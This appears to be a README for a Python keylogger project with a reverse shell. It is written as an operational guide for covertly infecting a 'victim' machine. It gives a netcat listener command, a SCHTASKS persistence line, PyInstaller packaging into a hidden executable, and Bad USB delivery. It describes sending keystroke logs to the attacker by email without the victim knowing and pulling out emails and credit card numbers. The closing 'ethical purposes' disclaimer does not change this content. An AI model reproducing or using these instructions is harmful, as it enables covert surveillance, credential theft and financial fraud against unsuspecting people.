# KeyLogger with Reverse Shell
  This is the source code for a collaborative project between Rob Peeples, Ricky Rodriguez, Jose Santiago, and Brian Mancil. 
This repository contains instructions on implementation of the code, the code itself, along with programs written to help filter through the data 
and recover important information such as emails or credit card numbers.

  Once the program is running on the target/victim's computer, every keystroke they input into their machine will be recorded into a log file. To improve readability 
and help with data filtering, each inputted word is on a separate line with the time it was typed to the left of it. The log file is created as soon as the program 
runs and can be accessed at a later time through a reverse shell that is created once a minute (on UNIX systems, read below). Alternatively, you can have the log file sent to your email once a
day (or however frequent you want). 

# Info
  For the reverse shell, a listener must be set up, this can be done on Linux/UNIX based machines with: "nc -lvnp 4444" in the terminal/command line if netcat is installed. MacOS and Linux systems have this command by default, but Windows users would have to simply download "nc.exe" to run a listener (which can be downloaded here: http://nmap.org/dist/ncat-portable-5.59BETA1.zip ). Because netcat is not pre-installed on windows, the Windows reverse shell is created with a python executable, and run from the command prompt.
  
There are comments on all of the scripts describing what each part does as well as what parts need to be edited to work in a seperate scenario. Depending on how the script is implemented on the victim machine, and what operating system is running, will affect the overall usage. Each method creates a reverse shell which can be used to exfiltrate data, as well as the keylog.txt file which gets created in the same directory as the keylogger.py file. However, on Windows machines, python does not have the ability to create Scheduled Tasks (akin to CronJobs in UNIX systems), so those must be set manually. Due to the creation of the reverse shell when running the keylogger executable, this is as easy as a couple commands in the terminal which you can just copy and paste from here. You do have to have access to an administrator account to do this.

The attachmentss.py script is also used to exfiltrate data, via email. Both the To and From fields are the attacker, so the victim will be none the wiser of these emails, which can be sent at any desired frequency.
  
# PIP
To install the required modules/libraries for this project, PIP must be installed. To check, type "pip help" insto the command line. If PIP responds, then PIP is installed. Otherwise, there will be an error saying the program could not be found. It should be included with standard python installation but if for some reason it isnt, type the following commands to fix the issue:<br />
curl https://bootstrap.pypa.io/get-pip.py -o get-pip.py<br />
python get-pip.py

# Required Libraries
To import the modules required for this script, you must install them first. This can be done through the command line with PIP with the following commands:<br />
pip install pynput<br />
pip install python-crontab
# Commands For Windows
To begin, click Start, type in "cmd", and click "Run as Administrator". This is not necessary if you are already using a reverse shell and have administrator access. The syntax for Scheduled Tasks is as follows: <br />

SCHTASKS /CREATE /SC DAILY /TN "FOLDERPATH\TASKNAME" /TR "C:\SOURCE\FOLDER\APP-OR-SCRIPT" /ST HH:MM

Example: Runs keylogger at 8:30 AM<br />
SCHTASKS /CREATE /SC DAILY /TN "MyTasks\Keylogger" /TR "C:\Windows\System32\keylogger.exe" /ST 08:30

# Pyinstaller
After saving this code, downloading the required libraries, and making changes to the code as necessary, it can be turned into an executable with Pyinstaller. To install, type "pip install pyinstaller". Once Pyinstaller is installed and you have navigated to the directory the script is in, use the following commands to turn the python script into a Windows .exe file. By doing this, the victim would just have to run this program, without having to install python or the required modules.<br />
pyinstaller --onefile -w --hidden-import "pynput.keyboard._win32" --hidden-import "pynput.mouse._win32" keylogger.pyw

# Bad USB
As a method of implementation, a Bad USB/Arduino/Rubber Ducky can be used to transfer these files onto an unsuspecting victim, provided you have physical access to their machine and it is unlocked. A hidden reverse shell can easily be created using a keyboard emmulator, especially since it is considered as a Human Input Device or HID. Because it is recognized by the computer as an HID, it is inherently trusted to input keystrokes, allowing it to run any command or change any settings it's programmed to do.
# Disclaimer
  This project is for ETHICAL purposes ONLY and should NOT be used on an unknowing person/persons. We do not advocate malicious hacking, 
  and we are not responsible for the misuse of this product.
